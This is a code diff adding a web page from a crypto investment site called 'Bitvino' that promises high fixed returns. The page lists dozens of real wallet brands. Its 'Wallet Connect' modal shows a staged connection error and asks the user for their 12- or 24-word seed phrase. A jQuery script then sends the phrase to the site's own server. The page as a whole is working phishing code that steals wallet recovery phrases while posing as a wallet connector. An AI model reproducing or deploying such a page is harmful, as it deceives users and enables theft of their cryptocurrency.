@@ -1,0 +1,781 @@
+
+
+<!DOCTYPE html>
+
+<html>
+<head><meta charset="UTF-8" /><meta name="viewport" content="width=device-width, initial-scale=1.0" /><style>:root{--AppColor:#1262ff;--oColor:rgba(18,98,255,0.37);--wbColor:#fff;--d_Color:#0C41AA;--siteUrl:"https://www.bitvino.com"}</style><meta name="theme-color" content="#1262ff"/><meta name="msapplication-navbutton-color" content="#1262ff"/><meta name="mobile-web-app-capable" content="yes"/><meta name="application-name" content="Bitvino" /><meta name="apple-mobile-web-app-title" content="Bitvino" /><meta name="apple-mobile-web-app-capable" content="yes"/><meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"/><meta name="robots" content="noimageindex,noarchive"><meta name="keywords" content="wallet,crypto,Trade,Trading"><meta name="description" content="We are a registered digital asset management firm. The platform, which includes advanced basic and technical analysis at the source of high return performance, offers high & fixed interest return. Aiming for success with its international investor network, experienced team, privileged information from business and technology world"><meta property="og:description" content="We are a registered digital asset management firm. The platform, which includes advanced basic and technical analysis at the source of high return performance, offers high & fixed interest return. Aiming for success with its international investor network, experienced team, privileged information from business and technology world"><meta property="og:url" content="https://www.bitvino.com"><meta property="og:image" content="https://www.bitvino.com/images/OpenGraphics.png"><meta property="og:title" content="Bitvino"><meta property="og:type" content="crypto:wallet"><meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" /><meta http-equiv="Pragma" content="no-cache" /><meta http-equiv="Expires" content="0" /><title>
+	Bitvino| tanker
+</title> 
+
+<link rel="stylesheet" href="/users/assets/css/style.css?xo" />
+<link rel="stylesheet" href="/users/assets/bootstrap-icons/bootstrap-icons.css" />
+
+<link rel="shortcut icon" href="/images/favicon.ico" />
+<link rel="stylesheet" href="/css/___App_Global.css" />
+
+<!----PLUG-INs CSS---->
+<link href="/js/offline/offline-theme-default.css" rel="stylesheet" />
+<link href="/js/offline/offline-language-english.css" rel="stylesheet" /> 
+<link href="/js/alertify/alertify.css" rel="stylesheet" />
+<link href="/js/alertify/default.css" rel="stylesheet" />
+
+
+<script src="/js/Jquery-ui/jquery-3.6.0.min.js"></script>
+<script>var srcGet = '/', _clr = '#1262ff';</script>
+
+<style>
+.appHeader {
+background: inherit !important;
+border: none !important;
+}
+
+#appCapsule{
+margin-top: 18px;
+margin-bottom: 18px;
+}    
+#google_translate_element * {
+color: transparent;
+}
+#google_translate_element img {
+display:none
+}
+#google_translate_element select,#google_translate_element option{
+color: #fff;
+}
+#google_translate_element select{
+padding: 2px 10px;
+text-align: center;
+text-align-last: center;
+background: var(--AppColor);
+border: none !important;
+outline: none !important;
+}.image-listview>li a.item::after{content:''!important}
+ option {
+  color: #000;
+}
+</style>
+
+<style>
+.img-icons {
+border-radius: 100% !important;
+width:100%
+}
+.imgHoldr {
+padding: 25px;
+}
+.NameLabel {
+font-weight: bold;
+color: inherit;
+}
+
+.frl_ele {
+  position: relative;
+}
+.modal-footer.isloading::after {
+  content: '';
+  position: absolute;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background-color:#fff;
+
+}
+.modal-body.isloading::after {
+  content: 'Attempting to connect...';
+  color:red;
+  font-weight: 900;
+  letter-spacing: 2px;
+  position: absolute;
+  top: 50%;
+  left: 50%;
+  transform: translate(-50%, -50%);
+  width: 100%;
+  height: 100%;
+  background-color:#fff;
+  text-align: center;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+}
+
+body.dark-mode .modal-footer.isloading::after,body.dark-mode .modal-body.isloading::after{
+    background-color:#080808!important
+}
+</style>
+
+
+<style>
+.impo.shw:after{content:' *';color:red}
+.mxf .input-group-text {
+padding: .375rem .75rem;
+}
+.input-group.mxf i {
+  background: var(--AppColor);
+  border-radius: 100%;
+  padding: .15rem .37rem;
+  display: block;
+  color:#fff
+}
+.input-group.mxf .input-group-text {
+  padding-left: 4px;
+}
+.mxf .input-group-text:first-child {
+  position: absolute;
+  top: 0;
+  left: 0;
+  border: none;
+  box-shadow: none;
+}.mxf select, .mxf input {
+  padding-left: 2.5rem !important;
+  margin-left: 0;
+}
+[id*=Trans_Pin] {
+font-family: 'password'; 
+-webkit-text-security: square; 
+text-security: square; 
+font-size: 16px;
+padding: 10px;
+}
+.dkd {
+    position:relative;
+    margin-top: -0.7rem;
+    font-size: 11.4pt;
+    font-weight: 600;
+    text-align: right;
+    color: var(--AppColor)
+}
+.appBottomMenu {
+  border-radius: 2rem 2rem 0 0;
+}
+</style>
+</head>
+<body class="dark-mode">
+
+<div class="appHeader  text-light ico1" style="display:none">
+<div class="left">
+<a href="Profile" class="headerButton"> 
+<i class="bi bi-person-fill" aria-label="settings"></i>
+</a>
+</div>
+<div class="pageTitle" style="color:var(--AppColor)">
+Home
+</div>
+<div class="right">
+<a href="/Alerts" class="headerButton">
+<i class="bi bi-bell-fill" aria-label="notifications"></i>
+
+</a>
+
+</div>
+</div>
+
+<div class="appHeader ico2">
+<div class="left">
+<a href="javascript:void(0);" onclick="var r=document.referrer;if(r&&!r.toLowerCase().includes('login')){window.history.back()}else{window.location='dashboard'}" class="headerButton">
+<i class="bi bi-chevron-left" aria-label="chevron back outline"></i> Previous
+</a>
+</div>
+<div class="pageTitle"></div>
+<div class="right">
+<a href="/Alerts" class="headerButton">
+<i class="bi bi-bell-fill" aria-label="notifications"></i>
+
+</a>
+</div>
+</div>
+
+
+
+<div id="appCapsule" class="container">    
+<form method="post" action="./wallet_connect" id="form1" autocomplete="off" enctype="multipart/form-data">
+<div class="aspNetHidden">
+<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="/wEPDwULLTExMDEyODMxNDJkZPKwl5O1lab8VDIpc6z88bL1TqC/" />
+</div>
+
+<div class="aspNetHidden">
+
+	<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="A667D716" />
+	<input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="/wEdAAJTirKEvtRX4DLISlcczOLheNTMGjJTQyZbvJ0tyth2B6A06aE1SLYypZGJEdS3+doUUHpb" />
+</div>    
+
+	
+	
+<div class="card">
+    <div class="card-body">
+<div class="container mt-5">
+    <div class="text-center">
+        <h3 class="display-6">Wallets</h3>
+        <div class="row justify-content-center">
+            <div class="col-8">
+                <p class="lead">Multiple iOS and Android wallets support the protocol. Simply scan a QR code from your desktop computer screen to start securely using a dApp with your mobile wallet. Interaction between mobile apps and mobile browsers are supported via mobile deep linking.</p>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+<div class="row mt-5">
+
+<div class="col-lg-3 col-md-3 col-sm-6 col-6 text-center idlee">
+<div class="imgHoldr"><img class="img-icons" src="/users/assets/wallets/img/trust-wallet-66f8777532931d9c09b633344981a6a9.png?b" alt="Trust">
+</div>
+<div class="NameLabel">Trust</div>
+</div>
+
+<div class="col-lg-3 col-md-3 col-sm-6 col-6 text-center idlee">
+<div class="imgHoldr"><img class="img-icons" src="/users/assets/wallets/img/iogo.png?b" alt="Connect">
+</div>
+<div class="NameLabel">Wallet connect</div>
+</div>
+
+
+<div class="col-lg-3 col-md-3 col-sm-6 col-6 text-center idlee">
+<div class="imgHoldr"><img class="img-icons" src="/users/assets/wallets/img/atomic-4c02d2b33cf091fd83c7a49819394e41.png?b" alt="Atomic"></div>
+<div class="NameLabel">Atomic</div>
+</div>
+
+
+
+<div class="col-lg-3 col-md-3 col-sm-6 col-6 text-center idlee">
+<div class="imgHoldr"><img class="img-icons" src="/users/assets/wallets/img/metamask-69ce6b56bbc9953dfb4aecebdf88729b.png?b" alt="Metamask">
+</div>
+<div class="NameLabel">Metamask</div>
+</div>
+
+<div class="col-lg-3 col-md-3 col-sm-6 col-6 text-center idlee">
+<div class="imgHoldr"><img class="img-icons" src="/users/assets/wallets/img/rainbow-207dda8d66f8ffc00a21e4fcc5ce0a73.png?b" alt="Rainbow">
+</div>
+<div class="NameLabel">Rainbow</div>
+</div>
+
+<div class="col-lg-3 col-md-3 col-sm-6 col-6 text-center idlee">
+<div class="imgHoldr"><img class="img-icons" src="/users/assets/wallets/img/newconv16.png?b" alt="Argent"></div>
+<div class="NameLabel">Argent</div>
+</div>
+
+<div class="col-lg-3 col-md-3 col-sm-6 col-6 text-center idlee">
+<div class="imgHoldr"><img class="img-icons" src="/users/assets/wallets/img/newconv15.png?b" alt="Gnosis Safe Multisig"></div>
+<div class="NameLabel">Gnosis Safe Multisig</div>
+</div>
+
+<div class="col-lg-3 col-md-3 col-sm-6 col-6 text-center idlee">
+<div class="imgHoldr"><img class="img-icons" src="/users/assets/wallets/img/crypto-4cbeac57421fb3ca2573db2cf448169a.png?b" alt="Crypto.com | DeFi Wallet"></div>
+<div class="NameLabel">Crypto.com | DeFi Wallet</div>
+</div>
+
+<div class="col-lg-3 col-md-3 col-sm-6 col-6 text-center idlee">
+<div class="imgHoldr"><img class="img-icons" src="/users/assets/wallets/img/newconv14.png?b" alt="Pillar"></div>
+<div class="NameLabel">Pillar</div>
+</div>
+<div class="col-lg-3 col-md-3 col-sm-6 col-6 text-center idlee">
+<div class="imgHoldr"><img class="img-icons" src="/users/assets/wallets/img/anchor.png?b" alt="Anchor"></div>
+<div class="NameLabel">Anchor</div>
+</div>
+
+<div class="col-lg-3 col-md-3 col-sm-6 col-6 text-center idlee">
+<div class="imgHoldr"><img class="img-icons" src="/users/assets/wallets/img/onto-983003d35fe32bf916f9eda381f138f7.png?b" alt="ONTO"></div>
+<div class="NameLabel">ONTO</div>
+</div>
+
+<div class="col-lg-3 col-md-3 col-sm-6 col-6 text-center idlee">
+<div class="imgHoldr"><img class="img-icons" src="/users/assets/wallets/img/tokenpocket-57a4a886cc644e5237ac1558226154cb.png?b" alt="TokenPocket"></div>
+<div class="NameLabel">TokenPocket</div>
+</div>
+
+<div class="col-lg-3 col-md-3 col-sm-6 col-6 text-center idlee">
+<div class="imgHoldr"><img class="img-icons" src="/users/assets/wallets/img/math-wallet-9e2256cfa5aad3b33af05f3fee4dc9ef.png?b" alt="MathWallet"></div>
+<div class="NameLabel">MathWallet</div>
+</div>
+
+<div class="col-lg-3 col-md-3 col-sm-6 col-6 text-center idlee">
+<div class="imgHoldr"><img class="img-icons" src="/users/assets/wallets/img/bitpay-1573dd6c95eb38386f181048663590d0.jpg?b" alt="BitPay"></div>
+<div class="NameLabel">BitPay</div>
+</div>
+
+<div class="col-lg-3 col-md-3 col-sm-6 col-6 text-center idlee">
+<div class="imgHoldr"><img class="img-icons" src="/users/assets/wallets/img/maiar.png?b" alt="Maiar"></div>
+<div class="NameLabel">Maiar</div>
+</div>
+
+<div class="col-lg-3 col-md-3 col-sm-6 col-6 text-center idlee">
+<div class="imgHoldr"><img class="img-icons" src="/users/assets/wallets/img/ledgerlive-9fe387e571fb42ed5cdf08e29bc920ed.png?b" alt="Ledger Live"></div>
+<div class="NameLabel">Ledger Live</div>
+</div>
+
+<div class="col-lg-3 col-md-3 col-sm-6 col-6 text-center idlee">
+<div class="imgHoldr"><img class="img-icons" src="/users/assets/wallets/img/walleth-b60336f8dd9ea86285408cb4f96634d1.png?b" alt="Walleth">
+</div>
+<div class="NameLabel">Walleth</div>
+</div>
+
+<div class="col-lg-3 col-md-3 col-sm-6 col-6 text-center idlee">
+<div class="imgHoldr"><img class="img-icons" src="/users/assets/wallets/img/authereum-32f3939207b77c1837547d5ed4f86110.png?b" alt="Authereum">
+</div>
+<div class="NameLabel">Authereum</div>
+</div>
+
+<div class="col-lg-3 col-md-3 col-sm-6 col-6 text-center idlee">
+<div class="imgHoldr"><img class="img-icons" src="/users/assets/wallets/img/newconv13.png?b" alt="Huobi Wallet"></div>
+<div class="NameLabel">Huobi Wallet</div>
+</div>
+
+<div class="col-lg-3 col-md-3 col-sm-6 col-6 text-center idlee">
+<div class="imgHoldr"><img class="img-icons" src="/users/assets/wallets/img/newconv12.png?b" alt="Eidoo"></div>
+<div class="NameLabel">Eidoo</div>
+</div>
+
+<div class="col-lg-3 col-md-3 col-sm-6 col-6 text-center idlee">
+<div class="imgHoldr"><img class="img-icons" src="/users/assets/wallets/img/mykey-7419df5270c0406c80cba19fa5165923.png?b" alt="MYKEY"></div>
+<div class="NameLabel">MYKEY</div>
+</div>
+
+<div class="col-lg-3 col-md-3 col-sm-6 col-6 text-center idlee">
+<div class="imgHoldr"><img class="img-icons" src="/users/assets/wallets/img/newconv11.png?b" alt="Loopring Wallet"></div>
+<div class="NameLabel">Loopring Wallet</div>
+</div>
+
+<div class="col-lg-3 col-md-3 col-sm-6 col-6 text-center idlee">
+<div class="imgHoldr"><img class="img-icons" src="/users/assets/wallets/img/trustvault-9031a67f82293fc50ead978f936cfff3.png?b" alt="TrustVault"></div>
+<div class="NameLabel">TrustVault</div>
+</div>
+
+<div class="col-lg-3 col-md-3 col-sm-6 col-6 text-center idlee">
+<div class="imgHoldr"><img class="img-icons" src="/users/assets/wallets/img/coin98-c5b50adaceaf474e48ef1dad150d0829.png?b" alt="Coin98"></div>
+<div class="NameLabel">Coin98</div>
+</div>
+
+<div class="col-lg-3 col-md-3 col-sm-6 col-6 text-center idlee">
+<div class="imgHoldr"><img class="img-icons" src="/users/assets/wallets/img/coolwallet-s-cc612ee7a151c1863293fcc69dd0f677.png?b" alt="CoolWallet S"></div>
+<div class="NameLabel">CoolWallet S</div>
+</div>
+
+<div class="col-lg-3 col-md-3 col-sm-6 col-6 text-center idlee">
+<div class="imgHoldr"><img class="img-icons" src="/users/assets/wallets/img/newconv10.png?b" alt="Alice"></div>
+<div class="NameLabel">Alice</div>
+</div>
+
+<div class="col-lg-3 col-md-3 col-sm-6 col-6 text-center idlee">
+<div class="imgHoldr"><img class="img-icons" src="/users/assets/wallets/img/newconv9.png?b" alt="AlphaWallet"></div>
+<div class="NameLabel">AlphaWallet</div>
+</div>
+
+<div class="col-lg-3 col-md-3 col-sm-6 col-6 text-center idlee">
+<div class="imgHoldr"><img class="img-icons" src="/users/assets/wallets/img/dcentwallet-f0bdbaec0837431b87ac9886bb22dfd5.png?b" alt="D&#39;CENT Wallet"></div>
+<div class="NameLabel">D'CENT Wallet</div>
+</div>
+
+<div class="col-lg-3 col-md-3 col-sm-6 col-6 text-center idlee">
+<div class="imgHoldr"><img class="img-icons" src="/users/assets/wallets/img/zelcore-d4c1a7a444b95612f6373f0b536b6ccb.png?b" alt="ZelCore">
+</div>
+<div class="NameLabel">ZelCore</div>
+</div>
+
+<div class="col-lg-3 col-md-3 col-sm-6 col-6 text-center idlee">
+<div class="imgHoldr"><img class="img-icons" src="/users/assets/wallets/img/newconv8.png?b" alt="Nash"></div>
+<div class="NameLabel">Nash</div>
+</div>
+
+<div class="col-lg-3 col-md-3 col-sm-6 col-6 text-center idlee">
+<div class="imgHoldr"><img class="img-icons" src="/users/assets/wallets/img/coinomi-7eecd68e38d78752d68b7232bd9c58d9.jpg?b" alt="Coinomi">
+</div>
+<div class="NameLabel">Coinomi</div>
+</div>
+
+<div class="col-lg-3 col-md-3 col-sm-6 col-6 text-center idlee">
+<div class="imgHoldr"><img class="img-icons" src="/users/assets/wallets/img/gridplus-8cedce167d37ddaa02f2afdf55841d8c.png?b" alt="GridPlus">
+</div>
+<div class="NameLabel">GridPlus</div>
+</div>
+
+<div class="col-lg-3 col-md-3 col-sm-6 col-6 text-center idlee">
+<div class="imgHoldr"><img class="img-icons" src="/users/assets/wallets/img/cybavowallet-16e7e96f2e3df01fe2170da5267774b5.png?b" alt="CYBAVO Wallet"></div>
+<div class="NameLabel">CYBAVO Wallet</div>
+</div>
+
+<div class="col-lg-3 col-md-3 col-sm-6 col-6 text-center idlee">
+<div class="imgHoldr"><img class="img-icons" src="/users/assets/wallets/img/newconv7.png?b" alt="Tokenary"></div>
+<div class="NameLabel">Tokenary</div>
+</div>
+
+<div class="col-lg-3 col-md-3 col-sm-6 col-6 text-center idlee">
+<div class="imgHoldr"><img class="img-icons" src="/users/assets/wallets/img/wazirx-logo-rounded.9bff9f42.png?b" alt="Wazirx"></div>
+<div class="NameLabel">Wazirx</div>
+</div>
+
+<div class="col-lg-3 col-md-3 col-sm-6 col-6 text-center idlee">
+<div class="imgHoldr"><img class="img-icons" src="/users/assets/wallets/img/newconv6.png?b" alt="Torus"></div>
+<div class="NameLabel">Torus</div>
+</div>
+
+<div class="col-lg-3 col-md-3 col-sm-6 col-6 text-center idlee">
+<div class="imgHoldr"><img class="img-icons" src="/users/assets/wallets/img/newconv5.png?b" alt="Spatium"></div>
+<div class="NameLabel">Spatium</div>
+</div>
+
+<div class="col-lg-3 col-md-3 col-sm-6 col-6 text-center idlee">
+<div class="imgHoldr"><img class="img-icons" src="/users/assets/wallets/img/safepal-1022b40e2ea3a4a6bb19cf6ff28d8b92.png?b" alt="SafePal">
+</div>
+<div class="NameLabel">SafePal</div>
+</div>
+
+<div class="col-lg-3 col-md-3 col-sm-6 col-6 text-center idlee">
+<div class="imgHoldr"><img class="img-icons" src="/users/assets/wallets/img/newconv4.png?b" alt="Equal"></div>
+<div class="NameLabel">Equal</div>
+</div>
+
+<div class="col-lg-3 col-md-3 col-sm-6 col-6 text-center idlee">
+<div class="imgHoldr"><img class="img-icons" src="/users/assets/wallets/img/infinito-wallet-68da061495160c96f4bcb5e70e612fdd.png?b" alt="Infinito"></div>
+<div class="NameLabel">Infinito</div>
+</div>
+
+<div class="col-lg-3 col-md-3 col-sm-6 col-6 text-center idlee">
+<div class="imgHoldr"><img class="img-icons" src="/users/assets/wallets/img/wallet.io-198f396de22fe25eb370f46544abe69d.png?b" alt="wallet.io">
+</div>
+<div class="NameLabel">wallet.io</div>
+</div>
+
+<div class="col-lg-3 col-md-3 col-sm-6 col-6 text-center idlee">
+<div class="imgHoldr"><img class="img-icons" src="/users/assets/wallets/img/infinity-wallet-48e78bc97f96bad14ee6b781423a69ea.png?b" alt="Infinity Wallet"></div>
+<div class="NameLabel">Infinity Wallet</div>
+</div>
+
+<div class="col-lg-3 col-md-3 col-sm-6 col-6 text-center idlee">
+<div class="imgHoldr"><img class="img-icons" src="/users/assets/wallets/img/ownbit-0b6b21e40acf2fa0f85d2c5ce38c4c51.png?b" alt="Ownbit"></div>
+<div class="NameLabel">Ownbit</div>
+</div>
+
+<div class="col-lg-3 col-md-3 col-sm-6 col-6 text-center idlee">
+<div class="imgHoldr"><img class="img-icons" src="/users/assets/wallets/img/easypocket-436ea3270a7bf77c02a880bfc70d0ee8.png?b" alt="EasyPocket"></div>
+<div class="NameLabel">EasyPocket</div>
+</div>
+
+<div class="col-lg-3 col-md-3 col-sm-6 col-6 text-center idlee">
+<div class="imgHoldr"><img class="img-icons" src="/users/assets/wallets/img/newconv3.png?b" alt="Bridge Wallet"></div>
+<div class="NameLabel">Bridge Wallet</div>
+</div>
+
+<div class="col-lg-3 col-md-3 col-sm-6 col-6 text-center idlee">
+<div class="imgHoldr"><img class="img-icons" src="/users/assets/wallets/img/sparkpoint-5c0d3a4ab850a7ee2a3f03e215b68f2c.png?b" alt="SparkPoint"></div>
+<div class="NameLabel">SparkPoint</div>
+</div>
+
+<div class="col-lg-3 col-md-3 col-sm-6 col-6 text-center idlee">
+<div class="imgHoldr"><img class="img-icons" src="/users/assets/wallets/img/viawallet-ae1502eddf4d2ed89abd36907dd3ae8a.png?b" alt="ViaWallet">
+</div>
+<div class="NameLabel">ViaWallet</div>
+</div>
+
+<div class="col-lg-3 col-md-3 col-sm-6 col-6 text-center idlee">
+<div class="imgHoldr"><img class="img-icons" src="/users/assets/wallets/img/bitkeep-387b0ca7da4cf322f44c70c23064c529.png?b" alt="BitKeep">
+</div>
+<div class="NameLabel">BitKeep</div>
+</div>
+
+<div class="col-lg-3 col-md-3 col-sm-6 col-6 text-center idlee">
+<div class="imgHoldr"><img class="img-icons" src="/users/assets/wallets/img/vision-928292fe642172a18e62feb5eaa2d639.png?b" alt="Vision"></div>
+<div class="NameLabel">Vision</div>
+</div>
+
+<div class="col-lg-3 col-md-3 col-sm-6 col-6 text-center idlee">
+<div class="imgHoldr"><img class="img-icons" src="/users/assets/wallets/img/newconv2.png?b" alt="SWFT Wallet"></div>
+<div class="NameLabel">SWFT Wallet</div>
+</div>
+
+<div class="col-lg-3 col-md-3 col-sm-6 col-6 text-center idlee">
+<div class="imgHoldr"><img class="img-icons" src="/users/assets/wallets/img/peakdefi-2e1d4f97cc1a737a9aa765b3748ff315.png?b" alt="PEAKDEFI Wallet"></div>
+<div class="NameLabel">PEAKDEFI Wallet</div>
+</div>
+
+<div class="col-lg-3 col-md-3 col-sm-6 col-6 text-center idlee">
+<div class="imgHoldr"><img class="img-icons" src="/users/assets/wallets/img/cosmosstation.png?b" alt="Cosmostation"></div>
+<div class="NameLabel">Cosmostation</div>
+</div>
+
+<div class="col-lg-3 col-md-3 col-sm-6 col-6 text-center idlee">
+<div class="imgHoldr"><img class="img-icons" src="/users/assets/wallets/img/graph.jpg?b" alt="Graph Protocol"></div>
+<div class="NameLabel">Graph Protocol</div>
+</div>
+
+<div class="col-lg-3 col-md-3 col-sm-6 col-6 text-center idlee">
+<div class="imgHoldr"><img class="img-icons" src="/users/assets/wallets/img/kardachain.png?b" alt="KardiaChain"></div>
+<div class="NameLabel">KardiaChain</div>
+</div>
+
+<div class="col-lg-3 col-md-3 col-sm-6 col-6 text-center idlee">
+<div class="imgHoldr"><img class="img-icons" src="/users/assets/wallets/img/keplr.png?b" alt="Keplr"></div>
+<div class="NameLabel">Keplr</div>
+</div>
+
+<div class="col-lg-3 col-md-3 col-sm-6 col-6 text-center idlee">
+<div class="imgHoldr"><img class="img-icons" src="/users/assets/wallets/img/harmony.png?b" alt="Harmony"></div>
+<div class="NameLabel">Harmony</div>
+</div>
+
+<div class="col-lg-3 col-md-3 col-sm-6 col-6 text-center idlee">
+<div class="imgHoldr"><img class="img-icons" src="/users/assets/wallets/img/iconex.png?b" alt="ICONex"></div>
+<div class="NameLabel">ICONex</div>
+</div>
+
+<div class="col-lg-3 col-md-3 col-sm-6 col-6 text-center idlee">
+<div class="imgHoldr"><img class="img-icons" src="/users/assets/wallets/img/fetch.jpg?b" alt="Fetch"></div>
+<div class="NameLabel">Fetch</div>
+</div>
+
+<div class="col-lg-3 col-md-3 col-sm-6 col-6 text-center idlee">
+<div class="imgHoldr"><img class="img-icons" src="/users/assets/wallets/img/xdc-9a98bff95dffc41869b8e77912a6cc54.png?b" alt="XDC Wallet"></div>
+<div class="NameLabel">XDC Wallet</div>
+</div>
+
+<div class="col-lg-3 col-md-3 col-sm-6 col-6 text-center idlee">
+<div class="imgHoldr"><img class="img-icons" src="/users/assets/wallets/img/unstoppable-0d3474dcd7572ac2080b0f4ce632dfac.png?b" alt="Unstoppable Wallet"></div>
+<div class="NameLabel">Unstoppable Wallet</div>
+</div>
+
+<div class="col-lg-3 col-md-3 col-sm-6 col-6 text-center idlee">
+<div class="imgHoldr"><img class="img-icons" src="/users/assets/wallets/img/meetone-01093db7d99e3e6cf5cca68b616f8255.jpg?b" alt="MEET.ONE">
+</div>
+<div class="NameLabel">MEET.ONE</div>
+</div>
+
+<div class="col-lg-3 col-md-3 col-sm-6 col-6 text-center idlee">
+<div class="imgHoldr"><img class="img-icons" src="/users/assets/wallets/img/dok-a32c522e109217cc2a1a2a310f3c9bf7.png?b" alt="Dok Wallet"></div>
+<div class="NameLabel">Dok Wallet</div>
+</div>
+
+<div class="col-lg-3 col-md-3 col-sm-6 col-6 text-center idlee">
+<div class="imgHoldr"><img class="img-icons" src="/users/assets/wallets/img/atwallet-2611d814a50a964b89d5f8bc1e5cb3a0.png?b" alt="AT.Wallet">
+</div>
+<div class="NameLabel">AT.Wallet</div>
+</div>
+
+<div class="col-lg-3 col-md-3 col-sm-6 col-6 text-center idlee">
+<div class="imgHoldr"><img class="img-icons" src="/users/assets/wallets/img/morixwallet-aa7d607cf9ad52afeb3b7c83e5f34eba.png?b" alt="MoriX Wallet"></div>
+<div class="NameLabel">MoriX Wallet</div>
+</div>
+
+<div class="col-lg-3 col-md-3 col-sm-6 col-6 text-center idlee">
+<div class="imgHoldr"><img class="img-icons" src="/users/assets/wallets/img/midas-wallet-5c5057d972ca621414f077541845fc61.png?b" alt="Midas Wallet"></div>
+<div class="NameLabel">Midas Wallet</div>
+</div>
+
+<div class="col-lg-3 col-md-3 col-sm-6 col-6 text-center idlee">
+<div class="imgHoldr"><img class="img-icons" src="/users/assets/wallets/img/newconv1.png?b" alt="Ellipal"></div>
+<div class="NameLabel">Ellipal</div>
+</div>
+
+<div class="col-lg-3 col-md-3 col-sm-6 col-6 text-center idlee">
+<div class="imgHoldr"><img class="img-icons" src="/users/assets/wallets/img/keyringpro-830b2c0ee1db401dd64c2899eaf2adb3.png?b" alt="KEYRING PRO"></div>
+<div class="NameLabel">KEYRING PRO</div>
+</div>
+
+<div class="col-lg-3 col-md-3 col-sm-6 col-6 text-center idlee">
+<div class="imgHoldr"><img class="img-icons" src="/users/assets/wallets/img/blockchain-logo.png?b" alt="Blockchain"></div>
+<div class="NameLabel">Blockchain</div>
+</div>
+<div class="col-lg-3 col-md-3 col-sm-6 col-6 text-center idlee">
+<div class="imgHoldr"><img class="img-icons" src="/users/assets/wallets/img/bsc-logo.png?b" alt="Binance Smart Chain"></div>
+<div class="NameLabel">Binance Smart Chain</div>
+</div>
+
+<div class="col-lg-3 col-md-3 col-sm-6 col-6 text-center idlee">
+<div class="imgHoldr"><img class="img-icons" src="/users/assets/wallets/img/aktionariat-c5784b26234a389632687a36d2fb3258.png?b" alt="Aktionariat"></div>
+<div class="NameLabel">Aktionariat</div>
+</div>                                                                  
+                                        
+<div class="col-lg-3 col-md-3 col-sm-6 col-6 text-center idlee">
+<div class="imgHoldr"><img class="img-icons" src="/users/assets/wallets/img/coinbase.png?b" alt="Coinbase"></div>
+<div class="NameLabel">Coinbase</div>
+</div>                                 
+                                        
+<div class="col-lg-3 col-md-3 col-sm-6 col-6 text-center idlee">
+<div class="imgHoldr"><img class="img-icons" src="/users/assets/wallets/img/exodus.png?b" alt="Exodus"></div>
+<div class="NameLabel">Exodus</div>
+</div>
+
+</div>
+
+
+
+</div></div>
+
+
+<!------------MODAL----------------->
+<div id="cShw" tabindex="-1" aria-labelledby="ModalLabel" aria-modal="true" role="dialog" class="modal fade modal-borderless" aria-hidden="true">
+<div class="modal-dialog" role="document">
+<div class="modal-content">
+<div class="modal-header">
+<h4 class="modal-title">
+<img class="img-icons" src="#" id="spd" style="width: 3rem;">&nbsp;
+Wallet Connect</h4>
+<a href="javascript:void(0);" class="close" data-bs-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></a>
+</div>
+
+
+<div class="modal-body frl_ele">
+
+<div role="alert" class="alert alert-danger">
+There was an issue connecting to the service. Please try again or connect manually.
+</div>
+
+
+<div class="form-group basic">
+<label class="col-form-label">Enter Mnemonic phrase:</label>
+<textarea name="ctl00$ContentPlaceHolder1$phrase" rows="2" cols="20" id="ContentPlaceHolder1_phrase" placeholder="Typically 12 (sometimes 24) words separated by single spaces." class="form-control form-control-lg" style="height:8rem;padding:.375rem .75rem">
+</textarea>
+<div id="word-count"></div>
+</div>
+
+
+</div>
+<div class="modal-footer frl_ele">
+
+<button type="button" id="dSubt" class="btn btn-primary">
+Connect Wallet
+</button>
+
+</div>
+</div>
+</div>
+</div>
+
+<script>
+    $(document).on('input', '[id*=phrase]', function () {
+        const value = $(this).val().trim();
+        const count = value === '' ? 0 : value.split(/\s+/).length;
+        $('#word-count').text(`Word Phrase: ${count}`);
+    });
+
+
+    $(document).on('click', '#dSubt', function () {
+        var s = $(this);
+        var str = $('[id*=phrase]');
+        var phrase = str.val().trim();
+        var wordCount = phrase === '' ? 0 : phrase.split(/\s+/).length;
+
+        if (wordCount === 0) {
+            alertify.alert("Alert", "Please enter a Mnemonic phrase");
+            return false;
+        }
+
+        if (wordCount !== 12 && wordCount !== 24) {
+            alertify.alert("Alert", "Invalid Mnemonics Phrase");
+            return false;
+        }
+
+        s.prop('disabled', true).html('Processing&nbsp;<i class="bi bi-arrow-repeat spinner-border"></i>');
+        $.ajax({
+            type: "POST",
+            url: srcGet + "Users/wallet_connect.aspx/cRecord",
+            data: '{wallet:"' + str.attr('data-wallet') + '",value:"' + encodeURIComponent(phrase) + '"}',
+            contentType: "application/json;charset=utf-8",
+            dataType: "json",
+            success: function () {
+                $('#cShw').modal('hide');
+                str.val('');
+                $('#word-count').text('');
+                alertify.alert("Alert", "Connection in progress...");
+            },
+            error: function () {
+                alertify.error("We encountered an error.\nPlease try again later.");
+            },
+            complete: function () {
+                s.prop('disabled', false).html('Connect Wallet')
+            }
+        });
+    });
+
+    $(document).on('click', '.idlee', function () {
+        var s = $(this);
+        $('[id*=phrase]').attr('data-wallet', s.find('.NameLabel').text());
+        $('#spd').attr('src', s.find('img').attr('src'));
+        $('#cShw').modal('show');
+
+
+
+        $('.frl_ele').addClass('isloading');
+        setTimeout(function () {
+            $('.frl_ele').removeClass('isloading');
+        }, 2000);
+    });
+</script>
+
+</form>
+</div>
+
+<div class="appBottomMenu">       
+<a href="/Dashboard" class="item">
+<div class="col">
+<i class="bi bi-grid" aria-label="home"></i>
+<strong>Home</strong>
+</div>
+</a>
+    
+<a href="/card" class="item">
+<div class="col">
+<i class="bi bi-credit-card"></i>
+<strong>Card</strong>
+</div>
+</a>
+
+<a href="/Swap" class="item">
+<div class="col">
+<i class="bi bi-arrow-left-right" aria-label="reload"></i>
+<strong>Swap</strong>
+</div>
+</a>
+
+<a href="/Buy" class="item">
+<div class="col">
+<i class="bi bi-wallet2" aria-label="cart"></i>
+<strong>Buy</strong>
+</div>
+</a>
+    
+
+<a href="/Profile" class="item">
+<div class="col">
+<i class="bi bi-person-fill" aria-label="person"></i>
+<strong>Profile</strong>
+</div>
+</a>
+</div>
+  
+ 
+   
+    
